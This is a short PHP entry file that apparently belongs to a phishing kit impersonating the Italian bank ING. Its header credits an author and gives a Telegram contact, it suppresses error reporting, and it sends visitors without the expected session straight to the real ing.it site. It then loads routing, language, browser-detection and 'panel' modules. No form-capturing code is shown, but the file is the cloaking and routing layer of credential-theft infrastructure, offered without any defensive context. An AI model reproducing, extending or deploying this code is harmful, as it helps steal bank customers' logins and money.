<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51official
    ********************************************************/
    
    session_start();
    error_reporting(0);

    if( !isset($_SESSION['last_page']) || empty($_SESSION['last_page']) ) {
        header("Location: https://www.ing.it/");
        exit();
    }

    define('MAIN', realpath(__DIR__) . '/');
    define('BASEPATH', rtrim(dirname($_SERVER['SCRIPT_NAME']), '/') . '/');
    define('IMGSPATH',BASEPATH . 'media/imgs');
    define('CSSPATH',BASEPATH . 'media/css');
    define('JSPATH',BASEPATH . 'media/js');

    require_once MAIN . 'inc/BrowserDetection.php';
    require_once MAIN . 'inc/functions.php';
    require_once MAIN . 'inc/route.php';
    require_once MAIN . 'inc/lang.php';
    require_once MAIN . 'inc/panel.php';

?>